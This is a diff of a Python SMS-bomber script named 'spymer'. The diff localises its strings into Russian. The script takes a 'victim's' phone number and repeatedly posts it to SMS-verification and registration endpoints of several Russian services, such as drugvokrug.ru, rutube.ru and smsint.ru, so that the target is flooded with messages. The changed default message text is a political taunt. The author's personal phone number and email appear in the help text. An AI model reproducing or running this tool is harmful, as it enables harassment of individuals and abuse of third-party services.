@@ -5,9 +5,9 @@ class spymer:
 	def main(self):
 		print('8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.3.0      8888\n8888888888888888888888888\n8888888888888888888888888\n')
 		import requests, datetime, sys, time, argparse
-		parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by Fsystem88. May be not work. Only for Russia!", epilog='My contacts: +79153509908 (Russia) or e-mail - FSystem88@bk.ru')
-		parser.add_argument('phonenum', metavar='phone', help='the phone number (example: 79153509908)')
-		parser.add_argument('--name', help='name for SMSInt service (default: Hackers)')
+		parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog='Мой номер: +79153509908 (Москва) или e-mail - FSystem88@bk.ru')
+		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79153509908)')
+		parser.add_argument('--name', help='Текст для SMSInt сервиса (по умолчанию: Путин тебя любит ♥)')
 		args = parser.parse_args()
 		def showstatus(message, type='new'):
 			now = datetime.datetime.now().strftime('%H:%M:%S')
@@ -36,8 +36,8 @@ class spymer:
 		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
 		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
 		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
-		print(showstatus(wrapsbrace('info', True) + ('Send SMS to: +{}').format(_phone)))
-		print('Spammer started.\nIf you want to stop - press Ctrl+Z.')
+		print(showstatus(wrapsbrace('info', True) + ('Отправка SMS на: +{}').format(_phone)))
+		print('Спамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+Z.')
 		i = 1
 		iteration = 0
 		while i < 10:
@@ -62,7 +62,7 @@ class spymer:
 			drugvokrug = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': _phone})
 			rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
 			if _name == None:
-				smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name':'Hackers','phone': _phone})
+				smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name':'Путин тебя любит ♥','phone': _phone})
 			else:
 				smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone})
 			iteration += 1
